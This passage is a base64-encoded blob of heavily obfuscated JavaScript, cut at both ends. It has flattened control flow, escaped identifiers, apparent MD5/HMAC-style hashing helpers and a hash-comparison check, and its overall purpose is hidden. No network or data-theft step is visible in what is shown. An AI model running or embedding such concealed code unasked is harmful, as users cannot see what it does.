xLF9fX2E5Zys9LTUxOCxfX19fX19reTYrPTQyNDticmVhaztjYXNlIF9fX2E5Zy0yNjk6X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzRcdTAwNzdcdTAwNjIiXT1fX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDM5XHgzOVx4MzEiXSxfX19fdnQwKz0xMzIsX19fYTlnKz0tNDY0LF9fX19fX2t5Nis9MzQ4O2JyZWFrO2Nhc2UgX19fX3Z0MC0yMzk6X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzlcdTAwMzlcdTAwMzEiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Nlx4NjlceDYzIl09KDEsX19fbmw4WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzRceDM5XHg2OCJdKShfX19fX19ldjBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2OVx1MDAzOVx1MDAzMiJdLmxlZnQpO19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM5XHUwMDM5XHUwMDMxIl1bIlx4NWZceDVmXHg1Zlx4NjNceDZhXHgzOSJdPSgxLF9fX25sOFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM0XHgzOVx4NjgiXSkoX19fX19fZXYwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjlceDM5XHgzMiJdLnJpZ2h0KTtfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NzRceDc3XHg2MiJdPV9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4MzlceDM5XHgzMSJdLF9fX2E5Zys9LTkzLF9fX19fX2t5Nis9MjE0O2JyZWFrO2lmKF9fX192dDA+X19fX3Z0MCswKXtfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3NFx1MDA3N1x1MDA2MiJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM5XHUwMDM5XHUwMDMxIl0sX19fYTlnKz01MyxfX19fX19reTYrPS0xOTticmVha31jYXNlIF9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM5XHUwMDM5XHUwMDMxIl1bIlx4NWZceDVmXHg1Zlx4MzVceDZiXHgzNyJdKzkxOmRlZmF1bHQ6W19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM5XHUwMDM5XHUwMDMxIl1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzNVx1MDA2Ylx1MDAzNyJdLF9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM5XHUwMDM5XHUwMDMxIl1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3NFx1MDA2MVx1MDA3NCJdXT1bMTk2LC00Ml19fX19O19fX19fX2V2MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc3XHUwMDYzXHUwMDMxIl09dW5kZWZpbmVkO19fX19fX2V2MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDYxXHg2MVx4NzgiXT0oMSxfX19fX19ldjBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3OFx1MDA3OVx1MDA3NSJdKSgxMjIsLTI5MiwxNzMpWyJcdTAwNmVcdTAwNjVcdTAwNzhcdTAwNzQiXSgpWyJcdTAwNzZcdTAwNjFcdTAwNmNcdTAwNzVcdTAwNjUiXTtpZihfX19fX19ldjBbIlx4NWZceDVmXHg1Zlx4NzdceDYzXHgzMSJdKXtfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2NVx1MDA2OVx1MDA3NyJdPV9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NzZceDMwIl0sX19fX19oNngrPTEzOSxfX19fdnQwKz0tNjc1LF9fX2E5Zys9NjgsX19fX19fa3k2Kz00NzticmVha31lbHNle19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY1XHg3Nlx4MzAiXSxfX19fX2g2eCs9MzU5LF9fX192dDArPS01NTQsX19fYTlnKz02OCxfX19fX19reTYrPTExNzticmVha31jYXNlIF9fX192dDAtMTg6cmV0dXJuIF9fX19fYWF4O19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY1XHg3Nlx4MzAiXSxfX19fX2g2eCs9NDMzLF9fX192dDArPS0zLF9fX2E5Zys9LTEwMixfX19fX19reTYrPTcwO2JyZWFrO2Nhc2UgX19fX19oNngtMTY0OnJldHVybiBfX19fX2FheDtfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjVceDY5XHg3NyJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY1XHUwMDc2XHUwMDMwIl0sX19fX19oNngrPTIyMCxfX19fdnQwKz0xMjEsX19fX19fa3k2Kz03MDticmVhaztjYXNlIF9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg2ZVx4NmNceDM4Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3Nlx1MDA3YVx1MDA2YiJdKy0xMzE6W19fX3ZxOFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc2XHUwMDc0XHUwMDc0Il1dPV9fX196dHE7X19fdnE4WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzJceDc0XHg2NSJdPWZ1bmN0aW9uKl9fX19faDZ4KF9fX192dDAsX19fYTlnLF9fX19fX2t5Nj17WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc3XHgzOFx4MzIiXTp7fX0pe3doaWxlKF9fX192dDArX19fYTlnIT09ODkpe3dpdGgoX19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHgzOFx4MzJceDMzIl18fF9fX19fX2t5Nil7c3dpdGNoKF9fX192dDArX19fYTlnKXtjYXNlIF9fX192dDAtNjI6W19fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3N1x4MzhceDMyIl1bIlx4NWZceDVmXHg1Zlx4NmNceDY2XHg2OSJdXT1bLTEwMl07X19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHgzOFx4MzJceDMzIl09X19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc3XHgzOFx4MzIiXSxfX19fdnQwKz0tMjMyLF9fX2E5Zys9LTE3MTticmVhaztjYXNlIF9fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc3XHUwMDM4XHUwMDMyIl1bIlx4NWZceDVmXHg1Zlx4NmNceDY2XHg2OSJdKy0yODpyZXR1cm4gX19fdnE4WyJceDVmXHg1Zlx4NWZceDVmXHg3N1x4MzBceDc0Il09dHJ1ZSxfX19fX184eGM7X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzhcdTAwMzJcdTAwMzMiXT1fX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3OVx4MzlceDYxIl0sX19fYTlnKz0tNTU7YnJlYWs7aWYoX19fX3Z0MD09X19fX3Z0MCstOTUpe19fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM4XHUwMDMyXHUwMDMzIl09X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzBcdTAwMzlcdTAwNzYiXSxfX19hOWcrPS01NTticmVha31jYXNlIF9fX192dDAtOTQ6W19fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3N1x4MzhceDMyIl1bIlx4NWZceDVmXHg1Zlx4NmNceDY2XHg2OSJdXT1bMTcyXTtfX19fX193ODJbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzhceDc4XHg2MyJdPXt9O2ZvcihsZXQgX19fX19fbHhlIG9mIF9fX3ZxOFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc2XHUwMDc0XHUwMDc0Il0ucmVwbGFjZSgvW153XS9nLCIiKS50b0xvd2VyQ2FzZSgpKV9fX19fX3c4MlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzOFx4NzhceDYzIl1bX19fX19fbHhlXT1fX19fX193ODJbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzhceDc4XHg2MyJdW19fX19fX2x4ZV0rX19fX19fM2gxWzFdfHxfX19fX18zaDFbX19fX3Z0MCs3OF07X19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHgzOFx4MzJceDMzIl09X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzdcdTAwMzhcdTAwMzIiXSxfX19fdnQwKz04NyxfX19hOWcrPS0xMzk7YnJlYWs7Y2FzZS02MzpkZWZhdWx0OmNhc2UtMjIzOnJldHVybiBfX192cThbIlx4NWZceDVmXHg1Zlx4NWZceDc3XHgzMFx4NzQiXT10cnVlLF9fX19fXzh4YztfX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOFx1MDAzMlx1MDAzMyJdPV9fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDYyXHg3M1x4MzQiXSxfX19fdnQwKz0yMzIsX19fYTlnKz04MDticmVhaztpZihfX19fdnQwPT0xNDcpe19fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4MzhceDMyXHgzMyJdPV9fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY0XHUwMDY3XHUwMDc2Il0sX19fX3Z0MCs9MjMyLF9fX2E5Zys9ODA7YnJlYWt9fX19fTtfX192cThbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3N1x1MDAzMFx1MDA3NCJdPXVuZGVmaW5lZDtfX192cThbIlx4NWZceDVmXHg1Zlx4NWZceDZjXHg3OVx4NjIiXT0oMSxfX192cThbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMlx1MDA3NFx1MDA2NSJdKSgtKF9fX2E5Zys5NSksLShfX19fdnQwKzIzNikpWyJcdTAwNmVcdTAwNjVcdTAwNzhcdTAwNzQiXSgpWyJceDc2XHg2MVx4NmNceDc1XHg2NSJdO2lmKF9fX3ZxOFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc3XHUwMDMwXHUwMDc0Il0pe19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzZcdTAwNzFcdTAwMzgiXSxfX19fdnQwKz0zMDMsX19fYTlnKz0tMjUsX19fX19fa3k2Kz0zMTticmVha31lbHNle19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzZcdTAwNzFcdTAwMzgiXSxfX19fX2g2eCs9LTE4NCxfX19fdnQwKz0tMjYsX19fYTlnKz0tMjUsX19fX19fa3k2Kz0zMjc7YnJlYWt9Y2FzZSAzNzpjYXNlIF9fX19fX2t5Ni0gLTk3OnJldHVybiBfX193enY7X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY1XHg2OVx4NzciXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3OVx1MDAzMFx1MDAzNSJdLF9fX192dDArPTM3MCxfX19hOWcrPS0yODUsX19fX19fa3k2Kz0xNTQ7YnJlYWs7aWYoX19fYTlnPjIzNSl7X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjVcdTAwNjlcdTAwNzciXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2NVx1MDA3Nlx1MDAzMCJdLF9fX19faDZ4Kz0xMzgsX19fX3Z0MCs9LTMwNSxfX19hOWcrPS0yMjQsX19fX19fa3k2Kz0xOTk7YnJlYWt9Y2FzZSA5NDpjYXNlIF9fX19fX2t5Ni01ODpjYXNlLTIzOltfX195MDVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Mlx1MDAzMlx1MDA2NyJdLF9fX3kwNVsiXHg1Zlx4NWZceDVmXHg1Zlx4N2FceDM4XHgzNyJdXT1fX19fenRxO19fX3kwNVsiXHg1Zlx4NWZceDVmXHgzM1x4NjVceDYyIl09ZnVuY3Rpb24qX19fX19oNngoX19fX3Z0MCxfX19hOWcsX19fX19fa3k2LF9fX19fX2x4ZT17WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzhcdTAwNmZcdTAwNzQiXTp7fX0pe3doaWxlKF9fX192dDArX19fYTlnK19fX19fX2t5NiE9PTE0Mil7d2l0aChfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzN1x1MDA3OFx1MDA2YiJdfHxfX19fX19seGUpe3N3aXRjaChfX19fdnQwK19fX2E5ZytfX19fX19reTYpe2Nhc2UgX19fYTlnLTMxMTpbX19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDM4XHg2Zlx4NzQiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc1XHUwMDM5XHUwMDcyIl0sX19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDM4XHg2Zlx4NzQiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDcxXHg3NyJdXT1bLTEzNCwtMTc2XTtmb3IobGV0IF9fX196dHEgaW4gX19fX19qZ2wpe2lmKF9fX19famdsW19fX196dHFdIT09X19fX18zaTlbX19fX3p0cV0pe3JldHVybiBfX195MDVbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2OFx4NmQiXT10cnVlLF9fX19fXzNoMVs1XX19aWYoT2JqZWN0LmtleXMoX19fX19qZ2wpLmxlbmd0aCE9PU9iamVjdC5rZXlzKF9fX19fM2k5KS5sZW5ndGgpe19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM3XHg3OFx4NmIiXT1fX19fX19seGVbIlx4NWZceDVmXHg1Zlx4MzhceDZmXHg3NCJdLF9fX192dDArPTI1NSxfX19hOWcrPTQwLF9fX19fX2t5Nis9LTE1NDticmVha31lbHNle19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM3XHUwMDc4XHUwMDZiIl09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzhcdTAwNmZcdTAwNzQiXSxfX19fdnQwKz0tNTIsX19fYTlnKz0tOTgsX19fX19fa3k2Kz0xMTA7YnJlYWt9Y2FzZS0yMTk6Y2FzZSAyNzpyZXR1cm4gX19feTA1WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwNjhcdTAwNmQiXT10cnVlLF9fX19fXzNoMVs2XTtfX19fX19seGVbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzN1x4NzhceDZiIl09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg2OVx4MzZceDM1Il0sX19fX3Z0MCs9MTMwLF9fX19fX2t5Nis9MjMxO2JyZWFrO2Nhc2UgODg6Y2FzZSAxMTA6ZGVmYXVsdDpfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzN1x1MDA3OFx1MDA2YiJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM4XHUwMDZmXHUwMDc0Il0sX19fX3Z0MCs9MTc3LF9fX2E5Zys9LTQxMSxfX19fX19reTYrPTIzODticmVhaztjYXNlLTE2OmNhc2UgX19fYTlnLSAtNDI5OmZvcihsZXQgX19fX3p0cSBpbiBfX19fX2pnbCl7aWYoX19fX19qZ2xbX19fX3p0cV0hPT1fX19fXzNpOVtfX19fenRxXSl7cmV0dXJuIF9fX3kwNVsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDY4XHg2ZCJdPXRydWUsX19fX19fM2gxW19fX2E5ZysyODRdfX1pZihPYmplY3Qua2V5cyhfX19fX2pnbCkubGVuZ3RoIT09T2JqZWN0LmtleXMoX19fX18zaTkpLmxlbmd0aCl7X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzdcdTAwNzhcdTAwNmIiXT1fX19fX19seGVbIlx4NWZceDVmXHg1Zlx4MzhceDZmXHg3NCJdLF9fX2E5Zys9NDUxLF9fX19fX2t5Nis9LTYzOTticmVha31lbHNle19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM3XHg3OFx4NmIiXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOFx1MDA2Zlx1MDA3NCJdLF9fX192dDArPS0zMDcsX19fYTlnKz0zMTMsX19fX19fa3k2Kz0tMzc1O2JyZWFrfWNhc2UtNDU6W19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM4XHUwMDZmXHUwMDc0Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3NVx4MzlceDcyIl0sX19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzhcdTAwNmZcdTAwNzQiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDcxXHg3NyJdXT1bLTIyNSwtMTldO19fXzhvdFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZhXHg2N1x4NmMiXT1idWlsZENoYXJNYXAoX19feTA1WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjJcdTAwMzJcdTAwNjciXSk7X19fOG90WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzNcdTAwNjlcdTAwMzkiXT1idWlsZENoYXJNYXAoX19feTA1WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwN2FcdTAwMzhcdTAwMzciXSk7X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzdceDc4XHg2YiJdPV9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM4XHUwMDZmXHUwMDc0Il0sX19fX3Z0MCs9Mjc1LF9fX2E5Zys9LTE2MixfX19fX19reTYrPTgyO2JyZWFrO2Nhc2UgX19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDM4XHg2Zlx4NzQiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc1XHUwMDM5XHUwMDcyIl0rMTg3OnJldHVybiBfX195MDVbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2OFx4NmQiXT10cnVlLF9fX19fXzNoMVs1XTtfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzN1x1MDA3OFx1MDA2YiJdPV9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHgzOFx4NmZceDc0Il0sX19fX3Z0MCs9LTMwNyxfX19hOWcrPS0xMzgsX19fX19fa3k2Kz0yNjQ7YnJlYWt9fX19O19fX3kwNVsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDY4XHg2ZCJdPXVuZGVmaW5lZDtfX195MDVbIlx4NWZceDVmXHg1Zlx4NzdceDdhXHg3NiJdPSgxLF9fX3kwNVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMzXHUwMDY1XHUwMDYyIl0pKC00NCwtKF9fX2E5ZystMjQpLF9fX19faDZ4KzE0NylbIlx4NmVceDY1XHg3OFx4NzQiXSgpWyJceDc2XHg2MVx4NmNceDc1XHg2NSJdO2lmKF9fX3kwNVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDY4XHUwMDZkIl0pe19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzlcdTAwMzBcdTAwMzUiXSxfX19fX2g2eCs9LTEzMSxfX19fdnQwKz0xOTIsX19fYTlnKz05NCxfX19fX19reTYrPS05NDticmVha31lbHNle19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NjlceDc3Il09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzlcdTAwMzBcdTAwMzUiXSxfX19fX2g2eCs9LTEzMSxfX19fdnQwKz01NjIsX19fYTlnKz0tMTkxLF9fX19fX2t5Nis9NjA7YnJlYWt9aWYoX19fX19oNng+LTMxKXtfX19fX2g2eCs9MTg0LF9fX192dDArPTI2LF9fX2E5Zys9LTE1OSxfX19fX19reTYrPS05MTticmVha31jYXNlIF9fX192dDAtMjQzOmNhc2UgMTMwOl9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY1XHUwMDY5XHUwMDc3Il09X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzZcdTAwNzFcdTAwMzgiXSxfX19fX2g2eCs9NDcsX19fX3Z0MCs9OTIsX19fYTlnKz0tMjQsX19fX19fa3k2Kz0yNzE7YnJlYWs7Y2FzZSA3MzpjYXNlIF9fX19faDZ4IT0tMTYzJiZfX19fX2g2eC0gLTQwNTpjYXNlLTE4OnJldHVybiB1bmRlZmluZWQ7Y2FzZSAyMTI6cmV0dXJuIF9fX19seWI7X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY1XHg2OVx4NzciXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3Nlx1MDA3MVx1MDAzOCJdLF9fX19faDZ4Kz0tMTg0LF9fX192dDArPS0zMjksX19fX19fa3k2Kz0yOTY7YnJlYWs7aWYoX19fX19oNnghPV9fX2E5ZysxOTYpe19fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY1XHUwMDY5XHUwMDc3Il09X19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg3NVx4NjNceDZkIl0sX19fX19oNngrPTM0LF9fX192dDArPS0xMzYsX19fYTlnKz0yNCxfX19fX19reTYrPS02NzticmVha31kZWZhdWx0OnJldHVybiB1bmRlZmluZWQ7Y2FzZSAyMjM6cmV0dXJuIHVuZGVmaW5lZH19fX12YXIgX19fX194cHU7dmFyIF9fX19faDZ4PV9fX19fX3RpNSgtMzE1LDE4OSwxNDQsMTU0KVsiXHUwMDZlXHUwMDY1XHUwMDc4XHUwMDc0Il0oKVsiXHUwMDc2XHUwMDYxXHUwMDZjXHUwMDc1XHUwMDY1Il07aWYoX19fX194cHUpe3JldHVybiBfX19fX2g2eH19d2hpbGUoX19fX19fM2gxWzZdKXtpZigiXHg0MVx4MzdceDcwXHg2OFx4NmRceDZkIiBpbiBfX19fX19seGUpe19fX192dDAoKX1mdW5jdGlvbiBfX19fdnQwKCl7dmFyIF9fX19fX3RpNT1mdW5jdGlvbigpe3ZhciBfX19fX190aTU9X19fX19fM2gxWzJdO3ZhciBfX19fX3hwdT0iIjtmdW5jdGlvbiBfX19fX2g2eChfX19fX190aTUpe3JldHVybiBfX19nc3EoX19fX19fMnB0KF9fX19fX3FkcShfX19fX190aTUpKSl9ZnVuY3Rpb24gX19fX3Z0MChfX19fX190aTUpe3JldHVybiBfX182MjUoX19fX19fMnB0KF9fX19fX3FkcShfX19fX190aTUpKSl9ZnVuY3Rpb24gX19fYTlnKF9fX19fX3RpNSxfX19fX3hwdSl7cmV0dXJuIF9fX19fZGFxKF9fX19fXzJwdChfX19fX19xZHEoX19fX19fdGk1KSksX19fX194cHUpfWZ1bmN0aW9uIF9fX19fX2x4ZShfX19fX190aTUsX19fX194cHUpe3JldHVybiBfX19nc3EoX19fX3dsOChfX19fX19xZHEoX19fX19fdGk1KSxfX19fX19xZHEoX19fX194cHUpKSl9ZnVuY3Rpb24gX19fX3p0cShfX19fX190aTUsX19fX194cHUpe3JldHVybiBfX182MjUoX19fX3dsOChfX19fX19xZHEoX19fX19fdGk1KSxfX19fX19xZHEoX19fX194cHUpKSl9ZnVuY3Rpb24gX19fX19neDYoX19fX19fdGk1LF9fX19feHB1LF9fX19faDZ4KXtyZXR1cm4gX19fX19kYXEoX19fX3dsOChfX19fX19xZHEoX19fX19fdGk1KSxfX19fX19xZHEoX19fX194cHUpKSxfX19fX2g2eCl9ZnVuY3Rpb24gX19feTE4KCl7cmV0dXJuIF9fX19faDZ4KF9fX19fXzNoMVszMV0pLnRvTG93ZXJDYXNlKCk9PV9fX19fXzNoMVsxNTNdK19fX19fXzNoMVsxNTRdK19fX19fXzNoMVsxNTVdK19fX19fXzNoMVsxNTZdK19fX19fXzNoMVsxNTddK19fX19fXzNoMVsxNThdK19fX19fXzNoMVsxNTldK19fX19fXzNoMVszMl19ZnVuY3Rpb24gX19fX19fMnB0KF9fX19fX3RpNSl7cmV0dXJuIF9fXzY0aChfX19fcXdlKF9fX19lbzIoX19fX19fdGk1KSxfX19fX190aTUubGVuZ3RoKl9fX19fXzNoMVs3XSkpfWZ1bmN0aW9uIF9fX193bDgoX19fX19fdGk1LF9fX19feHB1KXt2YXIgX19fX19oNng9X19fX2VvMihfX19fX190aTUpO2lmKF9fX19faDZ4Lmxlbmd0aD5fX19fX18zaDFbOF0pX19fX19oNng9X19fX3F3ZShfX19fX2g2eCxfX19fX190aTUubGVuZ3RoKl9fX19fXzNoMVs3XSk7dmFyIF9fX192dDA9QXJyYXkoX19fX19fM2gxWzhdKSxfX19hOWc9QXJyYXkoX19fX19fM2gxWzhdKTtmb3IodmFyIF9fX19fX2x4ZT1fX19fX18zaDFbMl07X19fX19fbHhlPF9fX19fXzNoMVs4XTtfX19fX19seGUrKyl7X19fX3Z0MFtfX19fX19seGVdPV9fX19faDZ4W19fX19fX2x4ZV1eX19fX19fM2gxWzMzXTtfX19hOWdbX19fX19fbHhlXT1fX19fX2g2eFtfX19fX19seGVdXl9fX19fXzNoMVszNF19dmFyIF9fX196dHE9X19fX3F3ZShfX19fdnQwLmNvbmNhdChfX19fZW8yKF9fX19feHB1KSksX19fX19fM2gxWzExXStfX19fX3hwdS5sZW5ndGgqX19fX19fM2gxWzddKTtyZXR1cm4gX19fNjRoKF9fX19xd2UoX19fYTlnLmNvbmNhdChfX19fenRxKSxfX19fX19reTYoX19fX19fM2gxWzldK19fX19fXzNoMVsxMF0sX19fX19fM2gxWzExXSxfX19fX18zaDFbMTJdKSkpfWZ1bmN0aW9uIF9fX2dzcShfX19fX3hwdSl7dHJ5e19fX19fX3RpNX1jYXRjaChfX19fX2g2eCl7X19fX19fdGk1PV9fX19fXzNoMVsyXX12YXIgX19fX3Z0MD1fX19fX190aTU/X19fX19fM2gxWzEzXStfX19fX18zaDFbMzVdK19fX19fXzNoMVszNl06X19fX19fM2gxWzEzXStfX19fX18zaDFbMzddK19fX19fXzNoMVszOF07dmFyIF9fX2E5Zz0iIjt2YXIgX19fX19fbHhlO2Zvcih2YXIgX19fX3p0cT1fX19fX18zaDFbMl07X19fX3p0cTxfX19fX3hwdS5sZW5ndGg7X19fX3p0cSsrKXtfX19fX19seGU9X19fX194cHUuY2hhckNvZGVBdChfX19fenRxKTtfX19hOWcrPV9fX192dDAuY2hhckF0KF9fX19fX2x4ZT4+Pl9fX19fXzNoMVsxNl0mX19fX19fM2gxWzE0XSkrX19fX3Z0MC5jaGFyQXQoX19fX19fbHhlJl9fX19fXzNoMVsxNF0pfXJldHVybiBfX19hOWd9ZnVuY3Rpb24gX19fNjI1KF9fX19fX3RpNSl7dHJ5e19fX19feHB1fWNhdGNoKF9fX19faDZ4KXtfX19fX3hwdT0iIn12YXIgX19fX3Z0MD0iXHg0MVx4NDJceDQzXHg0NFx4NDVceDQ2XHg0N1x4NDhceDQ5XHg0YVx4NGIiKyJcdTAwNGNcdTAwNGRcdTAwNGVcdTAwNGZcdTAwNTBcdTA